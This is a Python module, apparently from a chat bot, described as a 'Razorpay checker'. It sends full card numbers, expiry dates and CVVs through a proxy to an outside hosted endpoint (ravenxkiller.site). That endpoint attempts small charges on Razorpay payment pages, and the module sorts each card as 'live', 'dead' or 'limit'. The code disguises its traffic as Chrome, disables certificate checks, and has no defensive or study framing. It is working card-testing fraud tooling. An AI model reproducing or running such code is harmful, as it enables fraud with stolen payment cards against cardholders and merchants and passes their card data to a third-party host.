"""
Razorpay checker — calls hosted API (r.php on VPS).
GET https://ravenxkiller.site/rz/r.php?cc=...&site=...&proxy=host:port:user:pass
"""

from __future__ import annotations

import json
import logging
import re
import urllib.parse
from typing import Any
from urllib.parse import quote, urlparse

from curl_cffi import requests as curl_requests

logger = logging.getLogger(__name__)

RZ_API_URL = "https://ravenxkiller.site/rz/r.php"
_HTTP_TIMEOUT = 90


def normalize_pages_url(raw: str) -> str:
    u = raw.strip()
    if "#" in u:
        u = u.split("#", 1)[0]
    if not u:
        return "https://razorpay.me/@tpstech"
    if not u.startswith("http"):
        if u.startswith("@"):
            u = "https://razorpay.me/" + u
        elif "razorpay.me" in u or "razorpay.com" in u:
            u = "https://" + u.lstrip("/")
        else:
            u = "https://razorpay.me/@" + u.lstrip("@")
    return u.rstrip("/")


def _proxy_url_to_param(proxy_url: str) -> str | None:
    """http://user:pass@host:port -> host:port:user:pass"""
    if not proxy_url or not str(proxy_url).strip():
        return None
    u = str(proxy_url).strip()
    if "://" not in u:
        return u
    p = urlparse(u)
    host = p.hostname or ""
    if not host:
        return None
    port = p.port or (443 if p.scheme == "https" else 80)
    user = p.username or ""
    password = p.password or ""
    if user:
        return f"{host}:{port}:{user}:{password}"
    return f"{host}:{port}"


def _cc_line(cc: str, month: str, year: str, cvv: str) -> str:
    yy = year.strip()
    if len(yy) == 2:
        yy = "20" + yy[-2:]
    return f"{cc.strip()}|{month.strip().zfill(2)}|{yy}|{cvv.strip()}"


def _map_api_json(data: dict[str, Any]) -> tuple[str, str, str, dict[str, Any]]:
    """Hosted r.php JSON -> bot tuple (status, message, code, dbg)."""
    api_status = str(data.get("status") or "error").lower()
    msg = str(data.get("message") or "")
    ml = msg.lower()
    dbg: dict[str, Any] = {
        "hosted_api": True,
        "site": data.get("site"),
        "time_taken": data.get("time_taken"),
        "amount_paise": 100,
        "currency": "INR",
    }

    if api_status == "charged":
        return "live", msg or "Charged", "charged", dbg

    if api_status == "approved":
        if "ccn" in ml or ("cvv" in ml and ("incorrect" in ml or "invalid" in ml)):
            return "live", msg, "ccn", dbg
        if "insufficient" in ml or "limit" in ml:
            return "live", msg, "live_limit", dbg
        if "3ds" in ml or "otp" in ml:
            return "dead", msg, "3ds_required", dbg
        return "live", msg, "approved", dbg

    if api_status == "error":
        if "proxy" in ml:
            return "unknown", msg, "proxy_error", dbg
        if "waf" in ml or "403" in ml:
            return "unknown", msg, "ajax_waf_403", dbg
        if "timeout" in ml:
            return "unknown", msg, "timeout", dbg
        return "unknown", msg, "error", dbg

    if "3ds" in ml or "otp" in ml:
        return "dead", msg, "3ds_required", dbg
    if "expired" in ml:
        return "dead", msg, "declined", dbg
    return "dead", msg or "declined", "declined", dbg


def charge_payment_page_card(
    page_url: str,
    cc: str,
    month: str,
    year: str,
    cvv: str,
    proxy_url: str | None = None,
    invoice: str | None = None,
    email: str | None = None,
    phone: str | None = None,
    timeout: float = 55.0,
    charge_amount_paise: int | None = None,
) -> tuple[str, str, str, dict[str, Any]]:
    site = normalize_pages_url(page_url)
    proxy_param = _proxy_url_to_param(proxy_url) if proxy_url else None
    if not proxy_param:
        return "unknown", "No proxy — use /proxy first", "proxy_error", {"site": site}

    params = {
        "cc": _cc_line(cc, month, year, cvv),
        "site": site,
        "proxy": proxy_param,
    }
    url = RZ_API_URL + "?" + urllib.parse.urlencode(params, quote_via=quote)
    req_timeout = min(float(timeout), _HTTP_TIMEOUT)

    try:
        resp = curl_requests.get(
            url,
            impersonate="chrome120",
            timeout=req_timeout,
            verify=False,
        )
    except Exception as e:
        logger.warning("rz api request failed: %s", e)
        err = str(e)[:200]
        if "proxy" in err.lower() or "connect" in err.lower() or "timeout" in err.lower():
            return "unknown", err, "proxy_error", {"site": site, "hosted_api": True}
        return "unknown", err, "exception", {"site": site, "hosted_api": True}

    text = (resp.text or "").strip()
    dbg: dict[str, Any] = {"hosted_api": True, "http_status": resp.status_code, "site": site}

    if not text:
        return "unknown", f"empty_response_http_{resp.status_code}", "empty", dbg

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        snippet = re.sub(r"\s+", " ", text)[:200]
        return "unknown", snippet or "invalid_json", "bad_json", dbg

    if not isinstance(data, dict):
        return "unknown", "invalid_api_response", "bad_json", dbg

    return _map_api_json(data)


def fetch_payment_page(page_url: str, proxy_url: str | None, timeout: float = 45.0) -> Any:
    """Legacy stub — site validation only; checkout runs on hosted API."""
    site = normalize_pages_url(page_url)
    return type("PaymentPageData", (), {"page_url": site, "payment_link_id": "-"})()
